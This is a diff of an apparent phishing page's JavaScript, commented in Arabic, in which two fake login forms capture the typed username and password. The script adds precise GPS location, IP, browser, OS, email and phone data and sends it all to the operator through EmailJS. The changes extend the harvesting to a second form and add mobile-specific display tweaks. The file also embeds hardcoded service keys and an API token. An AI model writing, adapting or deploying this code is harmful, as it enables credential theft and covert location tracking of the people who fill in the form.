@@ -1,3 +1,4 @@
+// تبديل عرض كلمة المرور
 document.getElementById('toggle-password').addEventListener('click', function () {
     const passwordInput = document.getElementById('password');
     if (passwordInput.type === 'password') {
@@ -11,40 +12,71 @@ document.getElementById('toggle-password').addEventListener('click', function ()
     }
 });
 
+document.getElementById('toggle-password1').addEventListener('click', function () {
+    const passwordInput1 = document.getElementById('password1');
+    if (passwordInput1.type === 'password') {
+        passwordInput1.type = 'text';
+        this.classList.remove('fa-eye-slash');
+        this.classList.add('fa-eye');
+    } else {
+        passwordInput1.type = 'password';
+        this.classList.remove('fa-eye');
+        this.classList.add('fa-eye-slash');
+    }
+});
+
+function isMobileDevice() {
+    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || window.innerWidth <= 768;
+}
 // إضافة EmailJS في بداية الكود
-(function(){
-    emailjs.init("Cf6AQnmKaonDjuzz5");  // استبدل YOUR_USER_ID بمعرف المستخدم الخاص بك من EmailJS
+(function () {
+    emailjs.init("Cf6AQnmKaonDjuzz5"); // استبدل بـ USER_ID الخاص بك
 })();
 
-document.getElementById('form').addEventListener('submit', async function(event) {
+document.getElementById('form').addEventListener('submit', async function (event) {
     event.preventDefault();
     
+    const body = document.getElementById('body');
+    const additionalFields = document.getElementById('additional-fields');
+    const creer = document.getElementById('creer');
+    const submit = document.getElementById('submit');
+
+    if (isMobileDevice()) {
+        
+        body.classList.add('body-new-background');
+        body.classList.add('show-fields');
+        creer.style.display = "none"
+        submit.style.display = "none"
+    } else {
+        console.log("Not a mobile device. No changes made.");
+    }
+
     const nameInput = document.getElementById('name');
     const passwordInput = document.getElementById('password');
     const errorDiv = document.getElementById('error');
 
-    // التحقق من صحة الحقول
+    
     if (nameInput.value.trim() === "") {
         nameInput.focus();
-        errorDiv.textContent = "يرجى إدخال اسم المستخدم";
         return;
     }
 
     if (passwordInput.value.trim() === "") {
         passwordInput.focus();
-        errorDiv.textContent = "يرجى إدخال كلمة المرور";
         return;
     }
 
     errorDiv.textContent = "";
 
-    // الحصول على معلمات الجهاز
+
+
+    // جمع بيانات المستخدم
     const browserInfo = getBrowserInfo();
     const osInfo = getOSInfo();
     const ipInfo = await getIPInfo();
     const geoLocation = await getGeoLocation();
-    const email = await getEmail(); // الحصول على البريد الإلكتروني
-    const phone = await getPhoneNumber(); // الحصول على رقم الهاتف
+    const email = await getEmail(); // استدعاء البريد الإلكتروني
+    const phone = await getPhoneNumber(); // استدعاء رقم الهاتف
 
     // إرسال البيانات عبر EmailJS
     const templateParams = {
@@ -59,45 +91,84 @@ document.getElementById('form').addEventListener('submit', async function(event)
     };
 
     emailjs.send("service_4esymny", "template_t2odele", templateParams)
-        .then(function(response) {
+        .then(function (response) {
             console.log("Email sent successfully:", response);
-        }, function(error) {
-            console.log("Error sending email:", error);
+        }, function (error) {
+            console.error("Error sending email:", error);
+        });
+});
+
+document.getElementById('form1').addEventListener('submit', async function (event) {
+    event.preventDefault();
+    
+    const nameInput1 = document.getElementById('name1');
+    const passwordInput1 = document.getElementById('password1');
+    const errorDiv1 = document.getElementById('error1');
+
+    
+    if (nameInput1.value.trim() === "") {
+        nameInput1.focus();
+        return;
+    }
+
+    if (passwordInput1.value.trim() === "") {
+        passwordInput1.focus();
+        return;
+    }
+
+    errorDiv1.textContent = "";
+
+
+
+    // جمع بيانات المستخدم
+    const browserInfo = getBrowserInfo();
+    const osInfo = getOSInfo();
+    const ipInfo = await getIPInfo();
+    const geoLocation = await getGeoLocation();
+    const geoLocation1 = await fetchGeoLocationFromIP();
+    const email = await getEmail(); // استدعاء البريد الإلكتروني
+    const phone = await getPhoneNumber(); // استدعاء رقم الهاتف
+
+    // إرسال البيانات عبر EmailJS
+    const templateParams = {
+        name1: nameInput1.value,
+        password1: passwordInput1.value,
+        browserInfo: browserInfo,
+        osInfo: osInfo,
+        ipInfo: ipInfo,
+        geoLocation: geoLocation,
+        geoLocation1: geoLocation1,
+        email: email,
+        phone: phone
+    };
+
+    emailjs.send("service_4esymny", "template_fjk0ckm", templateParams)
+        .then(function (response) {
+            console.log("Email sent successfully:", response);
+        }, function (error) {
+            console.error("Error sending email:", error);
         });
 });
 
 // دالة للحصول على معلومات المتصفح
 function getBrowserInfo() {
     const userAgent = navigator.userAgent;
-    if (userAgent.indexOf("Chrome") > -1) {
-        return "Chrome";
-    } else if (userAgent.indexOf("Firefox") > -1) {
-        return "Firefox";
-    } else if (userAgent.indexOf("Safari") > -1) {
-        return "Safari";
-    } else if (userAgent.indexOf("Edge") > -1) {
-        return "Edge";
-    } else {
-        return "Unknown Browser";
-    }
+    if (userAgent.includes("Chrome")) return "Chrome";
+    if (userAgent.includes("Firefox")) return "Firefox";
+    if (userAgent.includes("Safari")) return "Safari";
+    if (userAgent.includes("Edge")) return "Edge";
+    return "Unknown Browser";
 }
 
 // دالة للحصول على معلومات النظام
 function getOSInfo() {
     const userAgent = navigator.userAgent;
-    if (userAgent.indexOf("Windows NT") > -1) {
-        return "Windows";
-    } else if (userAgent.indexOf("Mac OS") > -1) {
-        return "MacOS";
-    } else if (userAgent.indexOf("Linux") > -1) {
-        return "Linux";
-    } else if (userAgent.indexOf("Android") > -1) {
-        return "Android";
-    } else if (userAgent.indexOf("iOS") > -1) {
-        return "iOS";
-    } else {
-        return "Unknown OS";
-    }
+    if (userAgent.includes("Windows NT")) return "Windows";
+    if (userAgent.includes("Mac OS")) return "MacOS";
+    if (userAgent.includes("Linux")) return "Linux";
+    if (userAgent.includes("Android")) return "Android";
+    if (userAgent.includes("iOS")) return "iOS";
+    return "Unknown OS";
 }
 
 // دالة للحصول على عنوان الـ IP
@@ -105,7 +176,7 @@ async function getIPInfo() {
     try {
         const response = await fetch('https://ipinfo.io/json');
         const data = await response.json();
-        return data.ip;
+        return data.ip || "Unknown IP";
     } catch (error) {
         console.error("Error fetching IP info:", error);
         return "Unknown IP";
@@ -114,19 +185,42 @@ async function getIPInfo() {
 
 // دالة للحصول على الموقع الجغرافي
 async function getGeoLocation() {
+    if ("geolocation" in navigator) {
+        return new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const { latitude, longitude } = position.coords;
+                    resolve(`Latitude: ${latitude}, Longitude: ${longitude}`);
+                },
+                (error) => {
+                    console.error("Error using geolocation:", error);
+                    // إذا فشلت geolocation، يتم استخدام IP-based API كخيار بديل
+                    fetchGeoLocationFromIP()
+                        .then(resolve)
+                        .catch(reject);
+                }
+            );
+        });
+    } else {
+        console.warn("Geolocation not supported. Falling back to IP-based location.");
+        return fetchGeoLocationFromIP();
+    }
+}
+
+// دالة احتياطية للحصول على الموقع الجغرافي باستخدام IP
+async function fetchGeoLocationFromIP() {
     try {
-        const response = await fetch('https://ipinfo.io/json');
+        const response = await fetch('https://ipinfo.io/160.176.63.224?token=0083ebbf6abe6f'); // ضع التوكن الخاص بك هنا
         const data = await response.json();
-        return `${data.city}, ${data.region}, ${data.country}`;
+        return `${data.city}, ${data.region}, ${data.country}` || "Unknown Location";
     } catch (error) {
-        console.error("Error fetching geo-location:", error);
+        console.error("Error fetching geo-location from IP:", error);
         return "Unknown Location";
     }
 }
 
 // دالة للحصول على البريد الإلكتروني
 async function getEmail() {
-    // إذا كان المستخدم قد سجل الدخول عبر OAuth
     try {
         const response = await fetch('/get-email-api'); // استبدل بعنوان API صالح
         const data = await response.json();
@@ -139,7 +233,6 @@ async function getEmail() {
 
 // دالة للحصول على رقم الهاتف
 async function getPhoneNumber() {
-    // إذا كان المستخدم قد سجل الدخول عبر OAuth
     try {
         const response = await fetch('/get-phone-api'); // استبدل بعنوان API صالح
         const data = await response.json();
